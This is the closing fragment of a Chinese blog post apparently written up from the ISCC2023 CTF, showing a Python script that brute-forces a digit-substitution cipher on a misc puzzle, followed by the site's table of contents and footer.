        cv2.imwrite(f&quot;./out/&#123;i&#125;.png&quot;, image_data.reshape(56, 28))
        print(2)
    else:
        print(i)
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251639491.png" alt="image-20230525163908349"></p><p>这里对图片信息识别，按顺序肉眼提取图片上的数字，以空格分隔，跑这个脚本：</p><pre><code class="language-python">import string
import itertools
import contextlib

def has_visible_bytes(input_bytes):
    return all(chr(byte) in string.printable for byte in input_bytes)

cipher_text = '859 685 853 876 852 859 856 638 851 687 688 851 857 873 899 660 854 682 802 666 850 802 685 855 686 873 828 685 853 685 870 859'.split(&quot; &quot;)

with open(&quot;out.txt&quot;, &quot;wb&quot;) as f:
    for i in itertools.permutations(&quot;0123456789&quot;, 10):
        maktrans = str.maketrans(&quot;0123456789&quot;, ''.join(i))

        lis = [str.translate(i, maktrans) for i in cipher_text]
        
        with contextlib.suppress(Exception):
            plan_text = bytes(list(map(lambda x: int(x), lis)))
            if has_visible_bytes(plan_text):
                print(plan_text)
                f.write(plan_text + b&quot;\n&quot;)
</code></pre><p>这里拿到一串 base64 加密后的数据，对照 ISCC 的 SVNDQ3 寻找</p><div class="tags"><a href="/tags/ISCC/" rel="tag"><i class="ic i-tag"></i> ISCC</a></div></div><footer><div class="meta"><span id="2023/06/01/ISCC2023/" class="item leancloud_visitors" data-flag-title="ISCC2023" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2023/06/01/ISCC2023/" title="ISCC2023">https://blog.xcu.icu/2023/06/01/ISCC2023/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2023/05/24/CommonsCollections-6/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;54.jpg" title="ConmonsCollection-6"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> java安全</span><h3>ConmonsCollection-6</h3></a></div><div class="item right"><a href="/2023/07/10/CommonsCollections-3/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;26.jpg" title="ConmonsCollection-3"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> java安全</span><h3>ConmonsCollection-3</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BE%8A%E4%BA%86%E4%B8%AA%E7%BE%8A"><span class="toc-number">1.1.</span> <span class="toc-text">羊了个羊</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%91%A8%E7%9A%84%E5%AF%86%E7%A0%81%E9%94%81"><span class="toc-number">1.2.</span> <span class="toc-text">小周的密码锁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E7%8B%BC%E8%80%81%E7%8B%BC%E5%87%A0%E7%82%B9%E4%BA%86"><span class="toc-number">1.3.</span> <span class="toc-text">老狼老狼几点了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chatggg"><span class="toc-number">1.4.</span> <span class="toc-text">ChatGGG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iscc%E7%96%AF%E7%8B%82%E8%B4%AD%E7%89%A9%E8%8A%82-1"><span class="toc-number">1.5.</span> <span class="toc-text">ISCC 疯狂购物节 - 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#where_is_your_love"><span class="toc-number">1.6.</span> <span class="toc-text">Where_is_your_love</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iscc%E5%8D%95%E8%BA%AB%E8%8A%82%E6%8A%BD%E5%A5%96"><span class="toc-number">1.7.</span> <span class="toc-text">ISCC 单身节抽奖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E5%A4%A7%E5%8F%B7%E8%AF%B4%E8%AF%9D"><span class="toc-number">1.8.</span> <span class="toc-text">上大号说话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iscc%E6%BB%A5%E7%94%A8%E8%81%8C%E6%9D%83-3"><span class="toc-number">1.9.</span> <span class="toc-text">ISCC 滥用职权 - 3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">2.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B"><span class="toc-number">2.1.</span> <span class="toc-text">三个愿望</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#login"><span class="toc-number">2.2.</span> <span class="toc-text">Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#double"><span class="toc-number">2.3.</span> <span class="toc-text">Double</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%B0%E5%B1%80"><span class="toc-number">2.4.</span> <span class="toc-text">困局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chef"><span class="toc-number">2.5.</span> <span class="toc-text">chef</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%9C%E8%AF%AD%E4%BA%BA"><span class="toc-number">2.6.</span> <span class="toc-text">谜语人</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eat_num"><span class="toc-number">2.7.</span> <span class="toc-text">eat_num</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E8%AF%86%E5%8A%BF"><span class="toc-number">2.8.</span> <span class="toc-text">第二识势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%94%A8%E7%AC%94"><span class="toc-number">2.9.</span> <span class="toc-text">第一用笔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sims"><span class="toc-number">2.10.</span> <span class="toc-text">SIMS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#your_character"><span class="toc-number">2.11.</span> <span class="toc-text">Your_character</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-number">3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#justdoit"><span class="toc-number">3.1.</span> <span class="toc-text">JustDoIt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%87%E9%97%A8%E9%81%81%E7%94%B2"><span class="toc-number">3.2.</span> <span class="toc-text">奇门遁甲</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#congratulations"><span class="toc-number">3.3.</span> <span class="toc-text">Congratulations</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E5%BD%A2%E8%AE%B0"><span class="toc-number">3.4.</span> <span class="toc-text">变形记</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#convert"><span class="toc-number">3.5.</span> <span class="toc-text">Convert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pull-the-wool-over-peoples-eyes"><span class="toc-number">3.6.</span> <span class="toc-text">Pull the Wool Over People&#39;s Eyes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8B%82%E5%BD%AA-1"><span class="toc-number">3.7.</span> <span class="toc-text">《狂彪》-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crackmeplease"><span class="toc-number">3.8.</span> <span class="toc-text">CrackMePlease</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%BD%E7%9C%8B%E7%9A%84%E7%BB%B4%E5%90%BE%E5%B0%94%E6%97%8F%E5%B0%8F%E5%A7%90%E5%A7%90"><span class="toc-number">4.1.</span> <span class="toc-text">好看的维吾尔族小姐姐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%BA%E7%94%9F%E4%B9%8B%E8%B7%AF"><span class="toc-number">4.2.</span> <span class="toc-text">人生之路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A4%E5%A7%86%E5%8E%86%E9%99%A9%E8%AE%B0"><span class="toc-number">4.3.</span> <span class="toc-text">汤姆历险记</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8F%9C%E9%B8%9F%E9%BB%91%E5%AE%A21"><span class="toc-number">4.4.</span> <span class="toc-text">菜鸟黑客 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mystery-of-bits"><span class="toc-number">4.5.</span> <span class="toc-text">mystery of bits</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">4.6.</span> <span class="toc-text">通信方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8F%9C%E9%B8%9F%E9%BB%91%E5%AE%A2-2"><span class="toc-number">4.7.</span> <span class="toc-text">菜鸟黑客 - 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E4%BC%A0%E9%80%92"><span class="toc-number">4.8.</span> <span class="toc-text">消息传递</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E7%9B%B8%E4%BF%A1ai%E5%90%97"><span class="toc-number">4.9.</span> <span class="toc-text">你相信 AI 吗？</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2022/09/23/ISCC2022/" rel="bookmark" title="ISCC2022">ISCC2022</a></li><li><a href="/2023/04/05/GKCTF2020/" rel="bookmark" title="GKCTF2020WP">GKCTF2020WP</a></li><li class="active"><a href="/2023/06/01/ISCC2023/" rel="bookmark" title="ISCC2023">ISCC2023</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">58</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">12</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">40</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2023/05/24/CommonsCollections-6/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2023/07/10/CommonsCollections-3/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="分类于 数据结构">数据结构</a></div><span><a href="/2022/10/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/" title="数据结构与算法入门">数据结构与算法入门</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/10/24/sql%E6%B3%A8%E5%85%A5/" title="SQL注入">SQL注入</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/REVERSE/" title="分类于 REVERSE">REVERSE</a></div><span><a href="/2023/03/05/%E5%B0%8F%E7%AB%AF%E5%BA%8F%E6%A0%87%E8%AE%B0%E6%B3%95/" title="小端序标记法">小端序标记法</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="yii反序列化">yii反序列化</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WP/" title="分类于 WP">WP</a></div><span><a href="/2022/09/23/ISCC2022/" title="ISCC2022">ISCC2022</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/11/09/preg_match&&%E6%AD%A3%E5%88%99/" title="preg_match&amp;&amp;正则">preg_match&&正则</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/03/26/java%E5%8F%8D%E5%B0%84/" title="java反射">java反射</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2023/03/20/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="被动信息收集">被动信息收集</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2022/09/23/%E5%9F%BA%E4%BA%8Esql-labs%E9%9D%B6%E5%9C%BA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E8%BF%9B%E9%98%B6%E7%AF%87/" title="基于sqli-labs进阶学习">基于sqli-labs进阶学习</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/04/01/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/" title="RMI浅记">RMI浅记</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">593k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">8:59</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2023/06/01/ISCC2023/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->